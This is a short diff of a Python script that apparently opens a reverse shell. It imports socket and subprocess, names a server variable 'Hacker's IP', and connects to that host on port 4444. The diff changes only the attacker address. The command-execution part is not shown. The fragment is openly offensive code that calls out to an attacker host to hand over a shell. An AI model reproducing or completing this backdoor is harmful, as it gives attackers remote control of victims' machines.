@@ -2,7 +2,7 @@ import socket as sc
 import subprocess as sp
 
 # Modify this
-server = "10.0.0.13"  # Hacker's IP
+server = "192.0.0.1"  # Hacker's IP
 port = 4444
 entrance = sc.socket()
 entrance.connect((server, port))
